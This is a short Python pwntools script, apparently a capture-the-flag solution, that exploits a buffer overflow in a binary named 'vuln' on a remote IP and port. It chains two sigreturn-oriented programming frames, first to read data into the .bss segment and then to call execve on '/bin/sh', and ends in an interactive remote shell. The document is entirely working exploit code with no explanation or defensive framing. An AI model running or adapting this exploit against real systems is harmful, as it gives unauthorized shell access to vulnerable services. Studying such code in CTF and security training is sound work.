from pwn import *
context.log_level='debug'
#p=process('./vuln')
p=remote('146.148.108.204',4444)
context.arch='amd64'
rax_s_l_r=0x0000000000401032
bss=0x00402000+0x800
sign=p64(rax_s_l_r)+p64(15)

sig=SigreturnFrame()
sig.rax=0
sig.rdi=0
sig.rsi=bss
sig.rdx=0x400
sig.rbp=bss
sig.rip=0x401033
sig.rsp=bss+0x200


pay="A"*0x80+p64(bss)+sign+str(sig)
#gdb.attach(p,'')


#p.sendafter("?",pay.ljust(0x400))
p.send(pay.ljust(0x400))
sig=SigreturnFrame()
sig.rax=0x3b
sig.rdi=bss
sig.rsi=0
sig.rdx=0
sig.rbp=0
sig.rip=0x401033
sig.rsp=0
n132="/bin/sh\x00"+sign+str(sig)

p.send(n132)
p.interactive()
